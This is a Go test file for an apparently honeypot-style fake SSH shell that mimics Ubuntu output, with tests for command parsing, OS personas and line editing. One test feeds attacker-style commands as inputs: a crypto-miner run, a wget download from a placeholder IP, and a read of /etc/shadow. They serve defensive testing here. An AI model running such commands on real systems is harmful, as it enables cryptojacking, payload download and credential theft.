package ssh

import (
	"testing"
	"time"

	"github.com/stretchr/testify/require"
)

func newTestShell(user string) *Shell {
	sh := NewShell(Personas[0], user)
	sh.Now = func() time.Time { return time.Date(2026, 10, 18, 20, 37, 0, 0, time.UTC) }
	return sh
}

func TestShellBasics(t *testing.T) {
	sh := newTestShell("root")
	require.Equal(t, "root@ubuntu:~# ", sh.Prompt())
	require.Equal(t, Result{Output: "root\n", Status: StatusOK}, sh.Run("whoami"))
	require.Equal(t, "uid=0(root) gid=0(root) groups=0(root)\n", sh.Run("id").Output)
	require.Equal(t, "Linux ubuntu 5.15.0-107-generic #117-Ubuntu SMP Fri Apr 26 12:26:49 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux\n", sh.Run("uname -a").Output)
	require.Equal(t, "x86_64\n", sh.Run("uname -m").Output)
	require.Equal(t, "Sun Oct 18 20:37:00 UTC 2026\n", sh.Run("date").Output)
}

func TestShellCompound(t *testing.T) {
	sh := newTestShell("root")
	res := sh.Run("cd /tmp && pwd; echo 'a b' > /tmp/x; echo hi")
	require.Equal(t, "/tmp\nhi\n", res.Output)
	require.Equal(t, "root@ubuntu:/tmp# ", sh.Prompt())
	require.Equal(t, "/root\n", sh.Run("cd; pwd").Output)
	require.Equal(t, "bash: cd: /nowhere: No such file or directory\n", sh.Run("cd /nowhere").Output)
	// a pipeline runs only its first command
	require.Equal(t, "Linux\n", sh.Run("uname | grep Linux | wc -l").Output)
	// quoted separators do not split
	require.Equal(t, "a;b\n", sh.Run(`echo "a;b"`).Output)
}

func TestShellUnknownAndExit(t *testing.T) {
	sh := newTestShell("pi")
	res := sh.Run("xmrig --donate")
	require.Equal(t, Result{Output: "bash: xmrig: command not found\n", Status: StatusNotFound}, res)
	require.True(t, sh.Run("ls; exit").Exit)
	require.Equal(t, "pi@ubuntu:~$ ", sh.Prompt())
	require.Equal(t, "wget: unable to resolve host address\n", sh.Run("sudo wget http://198.51.100.9/a").Output)
	require.Equal(t, "cat: /etc/shadow: No such file or directory\n", sh.Run("cat /etc/shadow").Output)
}

func TestShellFiles(t *testing.T) {
	for _, p := range Personas {
		sh := NewShell(p, "root")
		require.Contains(t, sh.Run("cat /etc/os-release").Output, `PRETTY_NAME="`+p.Pretty+`"`, p.Name)
		require.Equal(t, p.Hostname+"\n", sh.Run("hostname").Output, p.Name)
		require.Contains(t, sh.Run("cat /proc/cpuinfo").Output, p.CPU, p.Name)
	}
}

func TestLineEditor(t *testing.T) {
	var e LineEditor
	feed := func(s string) (lines []string) {
		for i := 0; i < len(s); i++ {
			if k := e.Feed(s[i]); k.Done {
				lines = append(lines, k.Line)
			}
		}
		return lines
	}
	require.Equal(t, []string{"ls -l", "pwd"}, feed("ls -l\r\npwd\n"))
	require.Equal(t, []string{"ab"}, feed("abc\x7f\r"))
	require.Equal(t, []string{"ls"}, feed("l\x1b[As\r"))
	require.Equal(t, []string{""}, feed("junk\x03"))
	require.True(t, e.Feed(0x04).EOF)

	long := make([]byte, MaxLine+10)
	for i := range long {
		long[i] = 'a'
	}
	var k Key
	for _, b := range append(long, '\r') {
		k = e.Feed(b)
	}
	require.True(t, k.Truncated)
	require.Len(t, k.Line, MaxLine)
}
